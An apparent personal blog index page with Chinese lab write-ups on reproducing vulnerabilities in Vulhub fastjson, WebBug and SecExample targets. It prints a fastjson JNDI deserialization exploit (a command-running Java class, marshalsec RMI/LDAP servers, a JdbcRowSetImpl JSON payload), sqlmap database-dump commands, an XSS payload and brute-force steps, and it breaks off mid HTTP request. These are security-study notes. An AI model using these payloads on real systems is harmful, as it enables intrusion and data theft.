<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary"><title>Hexo</title><link ref="canonical" href="http://example.com/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/30/Vulhub/">[ Untitled ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-31</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="fastjson"   >
          <a href="#fastjson" class="heading-link"><i class="fas fa-link"></i></a><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1>
      
        <h2 id="1-2-24"   >
          <a href="#1-2-24" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2>
      <p>在E:\靶场\vulhub-master\fastjson\1.2.24-rce目录下打开终端，运行</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></div></figure>

<p>运行界面图为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302030232.png" alt="image-20240530203035187"></p>
<p>运行之后新建一个TouchFile.java文件，写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success.txt&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在该java文件夹目录下打开终端，编译这个文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></div></figure>

<p>就能看到该目录下已经有了一个.class文件</p>
<p>python开启http服务</p>
<p>终端输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></div></figure>

<p>可以访问一下这个网页看是否开启成功</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8000</span><br><span class="line">//ip地址也可以为本机ip地址</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302023728.png"></p>
<p>可以看到文件目录下有这么些文件</p>
<p>借助marshalsec项目开启RMI服务<br>marshalsec:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec" >https://github.com/mbechler/marshalsec</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>下载完marshalsec之后，进到该目录下打开终端运行</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></div></figure>

<p>会生成一个target文件夹，里面又一个marshalsec-0.0.3-SNAPSHOT-all.jar文件说明已经配置成功了</p>
<p>在target文件夹内打开终端，运行</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://本机ip地址:8000/#TouchFile&quot; </span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302029680.png" alt="image-20240530202944628"></p>
<p>然后抓包（这个靶场的运行界面的包）发送到Repeater</p>
<p>修改请求头为POST，添加Content-Type为application/json，添加参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://本机ip地址:1099/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>com.sun.rowset.JdbcRowSetImpl</code> 是 Java 的一部分，属于 <code>javax.sql.rowset</code> 包。这个类实现了 <code>JdbcRowSet</code> 接口，提供了一个封装数据库结果集的 Java Bean 组件。关键的问题是，这个类在处理特定的属性（如 <code>dataSourceName</code>）时，可以触发 Java 的 JNDI服务，这可能会导致远程代码执行</p>
<p><code>dataSourceName</code> 属性被用于指定 JNDI 查找的地址。在正常情况下，这应该是数据库的位置，但在攻击场景中，这个地址被设置为恶意的 RMI服务器地址</p>
<p>当 Fastjson 创建 <code>JdbcRowSetImpl</code> 实例并设置其 <code>dataSourceName</code> 时，该实例会尝试连接到提供的 JNDI 地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302040219.png" alt="image-20240530204018163"></p>
<p>发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302041342.png" alt="image-20240530204111289"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405310920378.png" alt="image-20240531092032273"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311120287.png" alt="image-20240531112056134"></p>
<p>查看容器内的文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">//查看容器内内容的id号</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it id号 /bin/bash</span><br><span class="line">//进入该容器</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /tmp</span><br><span class="line">//查看该文件夹下的文件</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302043378.png" alt="image-20240530204334328"></p>

        <h2 id="1-2-47"   >
          <a href="#1-2-47" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h2>
      <p>方法同1.2.24</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/30/WebBug%E9%9D%B6%E5%9C%BA/">WebBug-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-31</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="暴力破解"   >
          <a href="#暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1>
      
        <h2 id="登录1、3"   >
          <a href="#登录1、3" class="heading-link"><i class="fas fa-link"></i></a><a href="#登录1、3" class="headerlink" title="登录1、3"></a>登录1、3</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301035256.png" alt="image-20240530103559225"></p>
<p>随便输入信息登录，抓包，发送到攻击器，选择字典开始攻击</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301036804.png" alt="image-20240530103657752"></p>
<p>爆破出账号密码</p>
<p>（登录3可以用sql注入绕过密码）</p>

        <h2 id="登录5-有验证码"   >
          <a href="#登录5-有验证码" class="heading-link"><i class="fas fa-link"></i></a><a href="#登录5-有验证码" class="headerlink" title="登录5-有验证码"></a>登录5-有验证码</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301105554.png" alt="image-20240530110506521"></p>
<p>有验证码了，随便输入信息登录，抓包，发送到Repeater</p>
<p>发包后提示账号或密码错误，修改账号再次发包，发现还是提示账号或密码错误，说明这个验证码是可以重复使用的</p>
<p>发送到攻击器，选择字典开始攻击</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301104634.png" alt="image-20240530110442577"></p>

        <h1 id="越权"   >
          <a href="#越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#越权" class="headerlink" title="越权"></a>越权</h1>
      <p>DeleteUserServlet.java</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301405684.png" alt="image-20240530140538642"></p>
<p>必须grade和user_rights都为2才能执行删除操作，而user_rights是在ini.sql文件里就已经定义好的</p>

        <h1 id="SQL注入"   >
          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
      <p>UsersDao.java文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301341658.png" alt="image-20240530134125613"></p>
<p>已经添加了预处理语句，防止了SQL注入攻击</p>

        <h1 id="XSS"   >
          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301119084.png" alt="image-20240530111906053"></p>
<p>在content里输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>即出现弹窗，并且每次点击留言展示都会有弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405301119582.png" alt="image-20240530111948546"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/28/SecExample/">SecExample-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-31</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="SQL注入"   >
          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300944877.png" alt="image-20240530094448840"></p>
<p>UserMapper.java代码中使用了 <code>@Mapper</code> 和 <code>@Repository</code> 注解，这通常用于 MyBatis 的 Mapper 接口</p>
<p>使用了 MyBatis 框架，它通过 XML 配置文件或注解来定义 SQL 查询。这些查询语句可能存在于 MyBatis 的 XML 配置文件中，或者是通过注解方式定义的</p>
<p>检查 MyBatis 的 XML 配置文件或注解，找到 <code>UserMapper</code> 接口中 <code>listUser</code> 和 <code>listUserByName</code> 方法的具体实现</p>
<p>在UserMapper.xml中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300934056.png" alt="image-20240530093431953"></p>
<p>在 <code>listUserByName</code> 查询中，使用了 <code>$&#123;name&#125;</code> 来拼接 SQL 语句。<code>$&#123;&#125;</code> 是 MyBatis 的一种字符串替换方式，直接将用户输入的值插入到 SQL 查询中，这种方式容易导致 SQL 注入漏洞，如果用户输入了恶意的 SQL 代码，可能会破坏数据库或窃取数据</p>
<p>为了防止 SQL 注入漏洞，应使用 MyBatis 提供的 <code>#&#123;&#125;</code> 参数化查询方式。这种方式会使用预编译语句，确保用户输入不会直接作为 SQL 代码执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300954169.png" alt="image-20240530095433112"></p>
<p>使用sqlmap</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; --dbs</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis --tables</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis -T user --columns</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis -T user -C name,id,pwd --dump</span><br></pre></td></tr></table></div></figure>

<p>好像注入出来的信息和本身的界面一样…</p>

        <h1 id="RCE"   >
          <a href="#RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281403684.png" alt="image-20240528140353654"></p>
<p>映射 <code>/rce</code> 的 GET 请求到 <code>input</code> 方法</p>
<p><code>public String input()</code> 方法返回视图名称 <code>&quot;rce/rce&quot;</code>，渲染 <code>rce/rce</code> 页面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281404456.png" alt="image-20240528140417408"></p>
<p>从请求参数中获取名为 <code>command</code> 的值</p>
<p>检查 <code>command</code> 是否为 <code>null</code> 或空字符串，如果是，则默认设置为 <code>&quot;whoami&quot;</code></p>
<p>声明 <code>Process</code> 对象 <code>p</code>，用于存储运行的进程；声明 <code>String</code> 变量 <code>result</code>，用于存储命令执行的结果</p>
<p>使用 <code>Runtime.getRuntime().exec(command)</code> 执行命令（<code>Runtime.getRuntime().exec()</code> 是 Java 中用于在运行时执行系统命令的一个函数，<code>Runtime</code> 类允许应用程序与运行时环境进行交互）</p>
<p>如果执行命令时发生 <code>IOException</code>，捕获异常并打印堆栈跟踪</p>
<p>获取命令执行的标准输出流 <code>InputStream</code>，使用 <code>BufferedReader</code> 逐行读取标准输出，在 <code>while (true)</code> 循环中读取每一行的输出，并将其存储在 <code>result</code> 中，当读取到 <code>null</code> 时，表示输出结束，退出循环，如果在读取过程中发生 <code>IOException</code>，捕获异常并打印堆栈跟踪</p>

        <h1 id="spel表达式注入"   >
          <a href="#spel表达式注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#spel表达式注入" class="headerlink" title="spel表达式注入"></a>spel表达式注入</h1>
      <p>SpEL表达式注入是一种攻击方式，攻击者通过恶意输入在应用程序中执行任意的 SpEL 表达式，从而实现未授权的操作</p>
<p>SpEL 是 Spring Framework 提供的一种表达式语言，通常用于在 Spring 配置文件、注解和其他地方进行表达式计算</p>

        <h1 id="XSS"   >
          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281517734.png" alt="image-20240528151727685"></p>
<p>从请求参数中获取名为 <code>name</code> 的值，并将其赋给 <code>name</code> 变量</p>
<p>将 <code>Person</code> 对象添加到模型中，以便在视图中显示</p>
<p>返回视图名称 <code>xss/xssoutput</code>，用于渲染输出页面</p>
<p>由于用户输入的 <code>name</code> 值直接显示在输出页面 <code>xssoutput</code> 上，将用户输入的内容嵌入到 HTML 中，所以如果用户输入包含恶意脚本代码，会导致 XSS 攻击</p>

        <h1 id="CSRF"   >
          <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281619851.png" alt="image-20240528161919791"></p>
<p>从请求中获取 <code>User</code> 对象 <code>user1</code> 并设置到类成员变量 <code>user</code> 中，使用 <code>userService.addUser(user)</code> 将用户添加到服务中</p>

        <h1 id="SSRF"   >
          <a href="#SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290942265.png" alt="image-20240529094223191"></p>
<p>处理 POST 请求，接受一个 URL 参数，并通过 <code>HttpTool.getHttpReuest</code> 获取该 URL 的内容，然后将结果添加到模型中，返回视图 <code>ssrf/ssrfoutput</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290948049.png" alt="image-20240529094806007"></p>
<p><code>httpRequest(String requestUrl)</code>：接受一个 URL 参数，打开该 URL 的连接，读取内容并返回</p>
<p><code>getHttpReuest(String requestUrl)</code>：调用 <code>httpRequest</code> 方法，简化调用流程</p>
<p>由于应用程序从用户输入获取 URL 并直接在服务器上发起请求，而没有进行任何验证或过滤，所以用户可以通过服务器代理访问任意资源</p>

        <h1 id="CORS"   >
          <a href="#CORS" class="heading-link"><i class="fas fa-link"></i></a><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291020680.png" alt="image-20240529102023649"></p>
<p>使用 <code>@CrossOrigin</code> 注解配置跨域访问，允许来自任何域的请求，这是 Spring 的一种声明式配置方式</p>
<p>将敏感信息添加到模型中，并返回视图名 <code>cors/cors</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291029949.png" alt="image-20240529102922909"></p>
<p>在响应头中设置 <code>Access-Control-Allow-Origin</code>，允许来自任何域的跨域请求，它允许任意网站读取该资源，将敏感信息添加到模型中，直接设置响应头，这是一个编程式配置方式，需要在每个方法中显式设置响应头</p>
<p>在模型中添加了敏感信息 <code>info</code>，如果没有适当的访问控制措施，可能导致敏感信息泄露。</p>
<p>并且这两个都设置了都会返回 <code>Access-Control-Allow-Origin: *</code>，意味着允许任何来源的跨域请求</p>

        <h1 id="Fastjson反序列化"   >
          <a href="#Fastjson反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h1>
      
        <h3 id="代码分析"   >
          <a href="#代码分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291633945.png" alt="image-20240529163300842"></p>
<p><code>JSON.parseObject(jsonData)</code>：使用 FastJSON 库解析 JSON 数据</p>
<p>设置 <code>User</code> 对象的属性 <code>age</code> 和 <code>username</code></p>
<p>将 <code>User</code> 对象添加到模型中，供视图使用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291634212.png" alt="image-20240529163444175"></p>
<p>将 <code>User</code> 对象添加到模型中</p>

        <h3 id="漏洞复现"   >
          <a href="#漏洞复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
      <p>首先修改dockerfile文件第一行为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM openjdk:8u111-jdk-alpine</span><br></pre></td></tr></table></div></figure>

<p>改之前这个docker的java版本是8u212</p>

        <h6 id="JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效"   >
          <a href="#JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效" class="heading-link"><i class="fas fa-link"></i></a><a href="#JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效" class="headerlink" title="JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK 8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效"></a>JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK 8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效</h6>
      <p>改了之后才能进行攻击</p>

        <h5 id="编译并上传命令执行代码"   >
          <a href="#编译并上传命令执行代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#编译并上传命令执行代码" class="headerlink" title="编译并上传命令执行代码"></a>编译并上传命令执行代码</h5>
      <p>新建一个Touch.java文件，写入</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Touch</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/Touch&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后在该文件目录下打开终端，编译，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Touch.java</span><br></pre></td></tr></table></div></figure>

<p>此时该目录下会生成一个Touch.class文件</p>

        <h5 id="启动http服务"   >
          <a href="#启动http服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动http服务" class="headerlink" title="启动http服务"></a>启动http服务</h5>
      <p>打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444   //端口号只要不被其他应用占用就行</span><br></pre></td></tr></table></div></figure>


        <h5 id="启动LDAP服务器"   >
          <a href="#启动LDAP服务器" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动LDAP服务器" class="headerlink" title="启动LDAP服务器"></a>启动LDAP服务器</h5>
      <p>在E:\Github\marshalsec-master\target目录下打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://主机ip地址:4444/#Touch&quot;</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311544536.png" alt="image-20240531154409456"></p>

        <h5 id="发包"   >
          <a href="#发包" class="heading-link"><i class="fas fa-link"></i></a><a href="#发包" class="headerlink" title="发包"></a>发包</h5>
      <p>抓包后修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson HTTP/1.1</span><br><span class="line">Host: 本机ip:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;100&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span 